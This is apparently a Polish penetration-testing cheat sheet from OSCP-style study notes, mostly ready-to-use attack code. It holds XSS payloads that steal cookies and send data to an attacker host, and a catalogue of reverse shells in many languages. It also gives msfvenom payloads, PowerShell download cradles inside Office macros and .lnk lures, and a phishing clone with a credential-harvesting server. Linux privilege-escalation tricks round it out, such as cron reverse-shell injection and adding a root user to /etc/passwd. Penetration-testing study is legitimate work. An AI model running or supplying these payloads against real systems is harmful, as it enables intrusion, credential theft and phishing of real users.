**Stored XSS → nowy admin (gdy cookie ma HttpOnly, nie ukradniesz):** XSS działa W sesji admina → sam pobiera nonce i tworzy konto.
```bash
# JS: GET /wp-admin/user-new.php → regex nonce → POST action=createuser&role=administrator
# minify (jscompress) + char-encode, dostarcz w User-Agent:
curl -i http://target --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
```
> Nonce chroni przed CSRF, ale nie przed XSS w uwierzytelnionej sesji. `eval(String.fromCharCode(...))` bo `' " &` psują dostarczenie przez nagłówek. Persistent → usuń konto po engagemencie (cleanup + raport).

**Kradzież ciasteczka (base64-encoded payload, żeby ominąć filtry):**
```html
<img src=x onerror=eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTkyLjE2OC4xODAuNzk6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))>
<!-- atob() dekoduje base64 → window.location='http://ATTACKER:8000/?c='+document.cookie -->
```
Nasłuch: `python3 -m http.server 8000` — ciasteczko wpadnie w parametrze `?c=`.

**Obfuskacja hex/unicode (bypass WAF):**
```html
<iframe src=ja&#x0D;vascript&colon;setTimeout('\x66\x65\x74\x63\x68...')></iframe>
```
**Fetch danych z niedostępnej dla nas ścieżki (SSRF-like przez XSS ofiary):**
```html
<script>
fetch('/internal/secret')
  .then(r=>r.json())
  .then(data=>fetch('http://ATTACKER/logger?data='+btoa(JSON.stringify(data))));
</script>
```

## 2.9 Reverse shells — katalog

> Odpal listener na swojej maszynie **zanim** wywołasz payload: `nc -lvnp $LPORT` (lub `rlwrap nc -lvnp $LPORT` dla historii/edycji).

### Bash
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```
### Netcat
```bash
nc -e /bin/sh $LHOST $LPORT
# Wersja bez -e (gdy netcat okrojony):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
```
### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
### PERL
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### socat (stabilniejszy, pełny TTY jednym strzałem)
```bash
# Listener (Ty):
socat file:`tty`,raw,echo=0 TCP-L:$LPORT
# Ofiara:
socat TCP:$LHOST:$LPORT EXEC:'bash',pty,stderr,setsid,sigint,sane
```
### xterm (klasyk)
```bash
# Ofiara łączy się z Twoim X-serwerem na TCP 6001:
xterm -display 10.0.0.1:1
# U Ciebie: Xnest :1  oraz  xhost +targetip
```
### PowerShell (Windows) — one-liner
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
> 🔗 Gdy nic nie działa: **https://www.revshells.com** — generator wszystkich powyższych + msfvenom, z podstawianiem IP/portu.

### msfvenom — generowanie payloadów
```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
# Windows EXE (meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Windows service EXE (do sc.exe)
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o myservice.exe
# MSI installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o installer.msi
# PHP webshell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

## 2.10 Webshelle

### Linux — reverse one-liner zrzucany do pliku
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
```
### Windows — pomocnicze
Sprawdź czy webshell wykonuje przez CMD czy PowerShell:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Pobranie powercat na maszynę atakującą (do serwowania na Windę):
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

## 2.11 Stabilizacja shella (upgrade do pełnego TTY)

> 🔗 Kompletny przewodnik: https://0xffsec.com/handbook/shells/full-tty/

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (alternatywy: script /dev/null -c bash   |   /usr/bin/script -qc /bin/bash /dev/null)
# 2. Wciśnij Ctrl+Z (usypia shell)
# 3. Na SWOIM terminalu:
stty raw -echo && fg
# 4. W shellu ofiary przywróć zmienne:
export TERM=xterm; export SHELL=bash
# 5. Dopasuj rozmiar okna (sprawdź `stty size` u siebie):
stty rows 38 columns 116
```

## 2.12 Locating & fixing public exploits

> Zanim uruchomisz cudzy exploit — **przeczytaj kod**. Publiczne PoC bywają celowo złośliwe (ukryty destrukcyjny payload w hex) albo po prostu psują cel. Dekoduj każdy „shellcode”/hex, zanim zaufasz.

### Szukanie
```bash
searchsploit apache 2.4.49                # szukaj po nazwie/wersji
searchsploit -t oracle windows            # -t = tylko w tytule
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -m 42341                     # -m = skopiuj (mirror) exploit do CWD
searchsploit -p 39446                     # -p = pełna ścieżka + URL exploit-db
ls /usr/share/exploitdb/exploits          # lokalne repo exploit-db
```
> Źródła online: **exploit-db.com**, **github.com** (`site:github.com <produkt> <wersja> exploit`), **packetstorm**, **nvd.nist.gov** (CVE→opis), **vulners.com**.

### Weryfikacja PoC przed uruchomieniem
```bash
# Ukryty payload w hex? Zdekoduj do czytelnej postaci, ZANIM odpalisz:
python3 -c 'print(bytes.fromhex("726d202d7266"))'    # → pokaże co naprawdę robi „shellcode”
```
> Czerwone flagi w PoC: `rm -rf`, `curl|bash` na obcy host, zaciemniony base64/hex, socket wychodzący poza cel. Testuj w izolowanej VM/wine, nie na swoim Kali produkcyjnym.

### Poprawianie / kompilacja exploitów
```bash
# Cross-kompilacja C dla Windows na Kali:
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32   # -lws2_32 gdy używa Winsock (WSAStartup/socket)
wine exploit.exe                                       # bezpieczny test na Kali
# Regeneracja shellcode dla BOF (podmień zmienną 'shellcode' w PoC):
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"         # -b = zakazane znaki (bad chars)
```
> Typowe zmiany w PoC: IP/port atakującego, ścieżka/URL celu, offset i adres powrotu (`JMP ESP`), payload (`<?php system($_GET['cmd']);?>` dla webshelli). Exploity webowe uruchamiasz po edycji zwykle: `python2 exploit_modified.py`, potem `curl -k https://$IP/uploads/shell.php?cmd=whoami`.

## 2.13 Metasploit Framework (MSF)

> Framework spinający recon → exploit → post-exploit → pivot. Na OSCP: **limit 1 użycia MSF na maszynę standalone** (przemyśl, gdzie go zużyjesz); w zestawie AD zwykle bez ograniczeń — sprawdź aktualny Exam Guide.

### Start i baza
```bash
sudo msfdb init          # inicjalizacja bazy postgres (raz)
sudo msfconsole          # start
```
```
db_status                # sprawdź połączenie z bazą
workspace -a pen200      # nowy workspace (izoluj projekty)
db_nmap -A $IP           # nmap z zapisem wyników do bazy
hosts                    # hosty w bazie
services -p 445          # usługi (filtr po porcie)
```
### Moduły — search / use / options / run
```
search type:exploit apache 2.4.49
search type:auxiliary smb          # skanery / enum
use 0                              # wybierz po indeksie z ostatniego search
use exploit/windows/smb/psexec     # albo po pełnej nazwie
show options                       # wymagane parametry
set RHOSTS $IP
set LHOST tun0                     # możesz podać interfejs zamiast IP
set LPORT 443
info                               # ZAWSZE przed run: efekty uboczne, stabilność, targets, czy zostawia ślady
check                              # nieintruzywny dry-run — potwierdź podatność ZANIM strzelisz (oszczędza próby)
run                                # lub: exploit   (exploit -j = w tle jako job)
```
> `setg` ustawia zmienną GLOBALNIE (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS. `info` → *Module side effects* (ślady w logach/na dysku), *Available targets* (0=Automatic vs in-memory/dropper). Zmień domyślny `LPORT 4444` → 443/80. „This exploit may require manual cleanup of /tmp/..." → **posprzątaj**.

**Auxiliary brute (`ssh_login`) — sam otwiera sesję + zapisuje creds do bazy:**
```
use auxiliary/scanner/ssh/ssh_login
set USERNAME george ; set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS $IP ; set RPORT 2222 ; set STOP_ON_SUCCESS true ; run
creds                              # przechwycone poświadczenia (host+usługa)
```
> W przeciwieństwie do Hydry — udany login OTWIERA sesję. Pamiętaj `RPORT` dla niestandardowych portów. Wzorzec działa dla `smb_login` itd. `smb_version` sam flaguje „SMB Signing Is Not Required".

**Baza — darmowa powierzchnia ataku (tylko przy `db_status` Connected):**
```
vulns          # podatności wywnioskowane z modułów (+ CVE)
creds          # przechwycone poświadczenia
loot ; notes   # pobrane pliki/zrzuty (SAM, /etc/passwd)
```

### Payloady — staged vs non-staged
```
show payloads                      # kompatybilne z wybranym exploitem
set payload windows/x64/meterpreter/reverse_tcp   # staged (meterpreter)
set payload linux/x64/shell_reverse_tcp           # non-staged (zwykły shell)
```
> **Staged** (`/meterpreter/reverse_tcp`) = mały stager dociąga resztę. **Non-staged** (`_reverse_tcp` bez `/`) = cały payload naraz — stabilniejszy przez proxy/tunel.

### Multi/handler — listener pod payload z msfvenom
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run -j                             # w tle; jobs = lista, kill <id> = zabij
```
### Meterpreter — post-exploitation
```
sysinfo ; getuid                   # kim / gdzie jestem
ps ; migrate <PID>                 # przeskocz do stabilnego procesu (np. explorer.exe)
getsystem                          # próba eskalacji do SYSTEM (Windows)
hashdump                           # dump SAM (po SYSTEM)
load kiwi                          # mimikatz wewnątrz meterpretera
download /etc/passwd               # pobierz plik z celu
upload winpeas.exe C:\Temp\        # wgraj na cel
shell                              # zejście do natywnego shella
background                         # (Ctrl+Z) → wróć do msf, sesja żyje
```
```
sessions -l                        # lista sesji
sessions -i 2                      # wejdź do sesji 2
sessions -u 1                      # UPGRADE zwykłego shella → meterpreter
```
### Local exploity / bypass UAC
```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
run
```
### Pivoting przez MSF (autoroute + SOCKS)
```
use post/multi/manage/autoroute    # dodaj trasy do wewn. podsieci przez sesję
set session 1
run                                # ręcznie: route add 172.16.5.0/24 1
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j                             # SOCKS5 na 127.0.0.1:1080 → proxychains
```
Po dodaniu trasy — skanuj i atakuj wewnętrzne hosty (⚠️ **przez pivot używaj bind, nie reverse** — cel wewn. nie ma trasy powrotnej do Kali):
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200 ; set PORTS 445,3389 ; run
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/bind_tcp     # BIND — nie reverse_tcp!
set SMBUser luiza ; set SMBPass 'Haslo1!'        # user musi być LOCAL ADMIN na celu
# w meterpreterze: portfwd add -l 3389 -p 3389 -r 172.16.5.200  → xfreerdp na 127.0.0.1:3389
# sessions -k <id> zabij · channel -l/-i żongluj shellami · route flush wyczyść trasy
```
### Resource scripts (automatyzacja)
```bash
msfconsole -r handler.rc           # uruchom komendy z pliku (.rc)
# w konsoli: makerc /tmp/setup.rc   # zapisz historię komend jako skrypt
```

## 2.14 Client-side attacks & phishing (koncepcja)

> ⚠️ Tylko w ramach **autoryzowanego** zaangażowania / labu. Cel: skłonić UŻYTKOWNIKA do uruchomienia kodu, gdy nie ma podatnej usługi sieciowej. Wektory: dokumenty z makrami, pliki HTA/LNK, sfałszowane strony logowania.

> 🎯 **Drogowskaz:** 1) **recon celu NAJPIERW** — payload musi pasować do platformy. Znajdź dokumenty (`site:cel filetype:pdf`, `gobuster -x pdf`) → `exiftool -a -u` → Author (pretekst) + Producer (wersja Office). 2) potwierdź OS/przeglądarkę: Canarytoken/Grabify (UA kłamie, ufaj JS-fingerprint). 3) wektor: Office+makro / `.Library-ms`+`.lnk` / phishing creds. 4) infra ZAWSZE przed dostawą: web server + `nc -nvlp 4444`.

### Fingerprinting klienta
```bash
exiftool -a -u brochure.pdf         # Author=pretekst, Producer/Creator=wersja Office; brak "for Mac"=Windows
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x pdf   # znajdź dokumenty (głośne)
# Aktywnie: canarytokens.org (Web bug) / grabify.link → JS-fingerprint OS+przeglądarka (nie ufaj samemu UA)
```
### Makro Office (VBA) — download & execute
> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu `.doc`/`.docm` (NIE `.docx`). Makro uruchamia PowerShell z **download-cradle**:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell
```
> ⚠️ **Surowy cradle często cicho pada** — zakoduj i potnij (dwa warunki działania `-enc`):
```bash
echo -n 'IEX(New-Object Net.WebClient)...' | iconv -t UTF-16LE | base64 -w0   # -enc przyjmuje TYLKO UTF-16LE!
# limit 255 zn. na LITERAŁ VBA (nie na zmienną) → tnij base64 na kawałki: Str = Str + "..."
python3 -c 's=open("b64.txt").read().strip();n=50;[print(f"Str = Str + \"{s[i:i+n]}\"") for i in range(0,len(s),n)]'
# w makrze: powershell.exe -nop -w hidden -enc <sklejony $Str>
```
> **MOTW / Protected View:** ofiara musi *Enable Editing* (pokona MOTW) → *Enable Content* (odpala makro). Post-2013 Office blokuje makra z netu. **Omijają MOTW:** FAT32, wnętrze 7z/ISO/IMG. Sprawdź: `Get-Content plik.doc -Stream Zone.Identifier`. „Macros in" ustaw na bieżący dokument, nie global template.

### Wektor .Library-ms + .lnk (WebDAV jako lokalny folder)
> `.Library-ms` renderuje zdalny WebDAV jako folder w Explorerze i przechodzi przez filtry blokujące linki. W środku `.lnk` z cradle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name><version>6</version><isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
<searchConnectorDescriptionList><searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation><isSupported>false</isSupported>
<simpleLocation><url>http://ATTACKER_IP</url></simpleLocation>
</searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>
```
```bash
# .lnk (target): powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e powershell"
cp automatic_configuration.lnk /home/kali/webdav/     # serwuj powercat.ps1 z OSOBNEGO :8000 (nie z WebDAV — AV)
smbclient //TARGET/share -c 'put config.Library-ms'   # dostawa
```
> `@windows.storage.dll,-34582` (nie `shell32.dll`) omija filtry łapiące „shell32". ⚠️ Po otwarciu Windows przepisuje `url` na `\\IP\DavWWWRoot` → **RESETUJ XML do oryginału przed KAŻDĄ wysyłką**, inaczej ofiara zobaczy pusty share. Nazwij `.lnk` benign (`automatic_configuration`).
> Analiza podejrzanych makr (blue-team / weryfikacja): `olevba dokument.docm`.

### Dostawa payloadu przez WebDAV / HTTP
```bash
sudo apt install python3-wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/   # share WebDAV
python3 -m http.server 80            # albo zwykły HTTP do download-cradle
nc -nvlp 4444                        # listener na reverse shell
```
### Phishing poświadczeń
> Sklonuj stronę logowania, podmień `action` na swój serwer, hostuj, zbieraj dane. `wget` szybko, ale SPA (Vue/CSRFGuard) pada → **single-file** (real Chromium renderuje DOM).
```bash
sudo apt install -y nodejs npm chromium && sudo npm install -g single-file-cli
single-file "https://przyklad.com/signin" signin.html --browser-executable-path /usr/bin/chromium
grep -oP '.{0,100}Next</span>' signin.html        # znajdź id przycisku (np. signin_btn_next) do podpięcia onclick
```
Weaponizacja klonu (BeautifulSoup — usuń cookie-SDK, podłóż krok hasła) + serwer zbierający z **302 misdirection**:
```python
# cred_server.py (:8080) — loguje i odsyła ofiarę na PRAWDZIWY serwis (myśli, że pomyliła hasło):
from http.server import HTTPServer,BaseHTTPRequestHandler; from urllib.parse import parse_qs
class H(BaseHTTPRequestHandler):
  def do_POST(s):
    d=parse_qs(s.rfile.read(int(s.headers.get('Content-Length',0))).decode())
    print(f"[+] {d.get('email',[''])[0]} : {d.get('password',[''])[0]}")
    s.send_response(302); s.send_header('Location','https://zoom.us/signin'); s.end_headers()
HTTPServer(('0.0.0.0',8080),H).serve_forever()
```
```bash
# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">  (ATTACKER_IP = publiczny IP, nie 127.0.0.1!)
python3 cred_server.py & sudo python3 -m http.server 80    # 2 serwery: zbieracz :8080 + host klonu :80
```
> **Dostawa:** z przejętego webmaila *Reply-all* w trybie HTML (URL ukryty pod „kliknij tutaj") — omija banery [EXTERNAL]. ⚠️ **MFA:** statyczne hasło nie wystarczy → real-time relay/BitM (**evilginx2**, cuddlephish). Wariant bez klonu: wymuś NTLM (`\\ATTACKER_IP\share`) + Responder (§5.4). Zawsze w granicach zgody klienta.

## 2.15 API attacks (REST / JSON)

> Nowoczesne apki mają backend API (`/api/`, `/v1/`, `/rest/`). Enumeruj endpointy, metody i logikę — częste błędy: **mass-assignment**, brak autoryzacji na endpointach admina, **verb tampering**, IDOR/BOLA.

### Enumeracja
```bash
ffuf -u http://$IP:5002/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
curl -i http://$IP:5002/users/v1                 # często zwraca listę userów / strukturę
curl -i http://$IP:5002/users/v1/admin/password  # sprawdź endpointy „admin”
# Wersjonowane ścieżki REST (gobuster pattern file):
printf '{GOBUSTER}/v1\n{GOBUSTER}/v2\n' > pattern
gobuster dir -u http://$IP:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://$IP:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt   # brute pól usera (email/password)
```
> **Czytaj BODY, nie tylko kod:** `404` z treścią „User not found" wciąż potwierdza istnienie. `405` = endpoint jest, zła metoda (→ verb tampering). Docsy: `/ui` lub `/console` = Swagger. Setup **Burp**: `burpsuite` → proxy `127.0.0.1:8080`, Intercept OFF → HTTP History → *Send to Repeater* (craft/replay) / *Intruder* (brute); `curl ... --proxy 127.0.0.1:8080` wpina curla do Burpa.
### Nadużycia
```bash
# Rejestracja z mass-assignment (dopisz sobie rolę admina przez ukryte pole):
curl -d '{"password":"lab","username":"pwn","email":"pwn@x.com","admin":"True"}' \
  -H 'Content-Type: application/json' http://$IP:5002/users/v1/register
# Logowanie → token (użyj w nagłówku Authorization przy kolejnych żądaniach):
curl -d '{"password":"lab","username":"pwn"}' -H 'Content-Type: application/json' http://$IP:5002/users/v1/login
# Verb tampering — zmień metodę na PUT/DELETE tam, gdzie GET był chroniony:
curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <JWT>' http://$IP:5002/users/v1/admin/password
```
> Sprawdzaj: **IDOR/BOLA** (podmień ID w ścieżce), brak autoryzacji na `/admin/*`, **JWT** (`jwt_tool`, słaby sekret → `hashcat -m 16500`), nadmiarowe pola w JSON. Zawsze `curl -i` — czytaj nagłówki i kody.

---

# 3. Post-Exploitation — Situational Awareness

> Cel fazy: „gdzie jestem, kim jestem, co widzę”. Automatyzuj (linpeas/winpeas), ale rozumiej ręczne komendy.

## 3.1 Linux — rozpoznanie lokalne

### Automat (najpierw to)
```bash
# Serwuj z Kali: python3 -m http.server 8000 ; potem na ofierze:
curl http://$LHOST:8000/linpeas.sh | sh
# alternatywy: pspy (podgląd procesów/cronów bez roota), LinEnum.sh
```

### System
```bash
cat /etc/issue; cat /etc/*-release; uname -a        # dystrybucja + wersja kernela
ls -lah /home/*                                      # kto ma home i jakie permisje
```
### Procesy
```bash
ps aux                                               # a,x = wszystkie; u = czytelnie
watch -n 1 "ps -aux | grep pass"                     # łap procesy zawierające 'pass'
```
### Sieć
```bash
route; routel                                         # tablice routingu
ss -anp                                               # połączenia: -a wszystkie, -n bez DNS, -p proces
sudo tcpdump -i lo -A | grep "pass"                   # podsłuch loopbacka, filtr 'pass'
```
### Firewall / Cron / Aplikacje
```bash
cat /etc/iptables/*                                   # reguły (Debian iptables-persistent)
ls -lah /etc/cron*                                    # zadania cron
cat /etc/crontab                                      # admini często dopisują tu joby jako root!
crontab -l                                            # zadania bieżącego usera
sudo crontab -l                                       # zadania root (jeśli sudo)
grep "CRON" /var/log/syslog                           # historia wykonań cron
dpkg -l                                               # zainstalowane pakiety (Debian)
```
### User trails (ślady poświadczeń)
```bash
env                                                   # zmienne środowiskowe (czasem hasła!)
cat ~/.bashrc                                         # trwałe zmienne (np. SCRIPT_CREDENTIALS)
cat ~/.bash_history                                   # historia poleceń
grep -rniE "password|passwd|secret|api_key" /var/www /home /etc 2>/dev/null
```
### Mounty i dyski
```bash
mount; cat /etc/fstab; lsblk                          # zamontowane / montowane przy boocie / dyski
```
### Kernel modules
```bash
lsmod                                                 # załadowane moduły
/sbin/modinfo libata                                  # szczegóły modułu (wymaga pełnej ścieżki)
```

## 3.2 Windows — rozpoznanie lokalne

### Automat
```powershell
# winPEAS.exe / winPEASany.exe  |  PowerUp.ps1 (Invoke-AllChecks)  |  Seatbelt.exe
.\winPEASx64.exe
```

### Kto i gdzie (użytkownik, host, uprawnienia)
```cmd
whoami                          :: domena\użytkownik
whoami /groups                  :: grupy (klucz do szukania uprawnień admina)
whoami /priv                    :: uprawnienia (SeImpersonate, SeBackup itd. → privesc!)
whoami /all                     :: wszystko naraz
hostname
net user <username>             :: szczegóły konkretnego konta
```
### Konta i grupy
```cmd
net user                        :: lokalni użytkownicy   (PS: Get-LocalUser)
net localgroup                  :: lokalne grupy         (PS: Get-LocalGroup)
net localgroup Administrators   :: kto ma admina         (PS: Get-LocalGroupMember Administrators)
```
### Uruchamianie jako inny user
```powershell
runas /user:dave powershell
Start-Process powershell -Verb runAs
```
### System operacyjny
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption, OSArchitecture, Version
```
### Sieć
```cmd
ipconfig /all                   :: pełna konfiguracja kart
netstat -ano                    :: połączenia + PID
arp -a                          :: tablica ARP (świetne do pivotingu — kto jest w LAN)
route print                     :: tablica routingu
```
### Oprogramowanie
```cmd
wmic product get name, version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname"
:: PS (szybsze niż wmic):
powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion"
```
### Procesy
```cmd
tasklist /v                     :: /v pokazuje na jakim koncie działa proces
powershell Get-Process
```
### Szukanie plików i historii
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.config -File -Recurse -ErrorAction SilentlyContinue
# Historia PowerShell (częsty jackpot z hasłami):
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Szukanie haseł w plikach:
findstr /si password *.txt *.ini *.config *.xml
```

---

# 4. Privilege Escalation (Eskalacja uprawnień)

> Cel fazy: z usera → root/SYSTEM. Najpierw automat (linpeas/winpeas), potem ręczna weryfikacja tropów.
> 🔗 **GTFOBins** (Linux): https://gtfobins.github.io  |  **LOLBAS** (Windows): https://lolbas-project.github.io

> 🎯 **Drogowskaz — Linux:** `sudo -l` (§4.1) → `id`/grupy → SUID (`find / -perm -4000`) → capabilities → cron zapisywalny → kernel (`uname -r`). Każdy trop sprawdź na GTFOBins.
> 🎯 **Drogowskaz — Windows:** `whoami /priv` (§4.2, szukaj SeImpersonate→potato) → usługi (unquoted/słabe ACL) → zapisane creds (`cmdkey /list`, historia PS, unattend/GPP) → AlwaysInstallElevated → auto-logon w rejestrze.
> 💎 **Co wartościowe:** hasła w plikach/historii/configu · reużywalne creds z usług · zapisywalny plik uruchamiany przez root/SYSTEM · token z przywilejem impersonacji.

## 4.1 Linux privesc

### SUID / SGID binaries
> Bit SUID (`s` zamiast `x`) pozwala uruchomić plik z prawami **właściciela**.
```bash
find / -perm -u=s -type f 2>/dev/null                 # znajdź SUID
find / -perm -g=s -type f 2>/dev/null                 # znajdź SGID
```
Jeśli np. `find` ma SUID → wykonaj polecenie jako root:
```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```
> Dla każdego nietypowego SUID-a sprawdź **GTFOBins** → sekcja "SUID".

### Sudo
```bash
sudo -l                                                # co user może uruchomić jako root/inny
```
Przykład: `(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get` → sprawdź każdy w GTFOBins ("Sudo").
> ⚠️ Uważaj na AppArmor — komenda z sudo może być blokowana profilem:
```bash
cat /var/log/syslog | grep tcpdump                     # szukaj apparmor="DENIED"
su - root; aa-status                                   # co AppArmor chroni
```
Sudo bez hasła + `LD_PRELOAD`/`env_keep`, stare CVE (Baron Samedit `sudo -V`), itp. — patrz GTFOBins.

### Capabilities
> Uprawnienia nadawane binarkom bez pełnego SUID. `cap_setuid+ep` = można zostać rootem.
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
```
/usr/bin/perl = cap_setuid+ep          <- jackpot
```
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Cron jobs z błędnymi uprawnieniami
```bash
grep "CRON" /var/log/syslog
ls -lah /etc/cron*
cat /etc/crontab
```
Znajdź katalogi/pliki zapisywalne przez usera:
```bash
find / -writable -type d 2>/dev/null                   # zapisywalne katalogi
find / -writable -type f 2>/dev/null | grep -v /proc    # zapisywalne pliki
```
Zapisywalny skrypt uruchamiany przez root-cron → **dopisz** (nie nadpisuj!) reverse shell:
```bash
ls -lah /home/joe/.scripts/user_backups.sh             # -rwxrwxrw- = każdy pisze
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 1234 >/tmp/f" >> user_backups.sh
nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0)
```
> Dopisuj przez `>>`, żeby legalny backup dalej działał. Cleanup: usuń dopisaną linię i `/tmp/f`.

### Zapisywalny /etc/passwd (nadpisanie hasła root)
> Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.
```bash
openssl passwd w00t                                    # wygeneruj hash crypt
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                                               # hasło: w00t
```

### Zbieranie poświadczeń lokalnie (hidden in plain view)
> Najszybsza droga do roota bywa przez podsłuchane/zapisane hasło (`su` z wyciekiem). Enum systemu → patrz §3.1.
```bash
env; cat ~/.bashrc ~/.bash_history 2>/dev/null         # eksporty typu SCRIPT_CREDENTIALS=...
watch -n 1 "ps -aux | grep pass"                       # łap krótkie procesy z hasłem w linii poleceń (sshpass -p...)
sudo tcpdump -i lo -A | grep "pass"                    # podsłuch creds usług lokalnych (user:root,pass:lab)
su - root                                              # spróbuj wyciekniętego hasła wprost
```
Pivot na inne konto SSH po wzorcu hasła (crunch → hydra):
```bash
crunch 6 6 -t Lab%%% > wordlist                         # 'Lab'+3 cyfry (% = cyfra); buduj z częściowego wywiadu
hydra -l eve -P wordlist $IP -t 4 ssh -V                # -t 4 nisko, by nie zrywać SSH
ssh eve@$IP; sudo -l
```

### Kernel exploit — pełny workflow (ostateczność)
> Gdy sudo/SUID/cap/cron martwe. Ryzyko crasha → tylko w zakresie, najlepiej najpierw na klonie.
```bash
uname -r; cat /etc/issue                                # dokładny kernel + dystrybucja (dobór CVE)
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
cp /usr/share/exploitdb/exploits/linux/local/45010.c . # 45010 = CVE-2017-16995 (Ubuntu 16, kernel <4.13.9)
scp 45010.c joe@$IP:                                    # transfer na cel
gcc 45010.c -o exp; file exp                            # kompiluj NA celu (unika niezgodności libów); file = sprawdź arch
./exp; id                                               # → uid=0
```
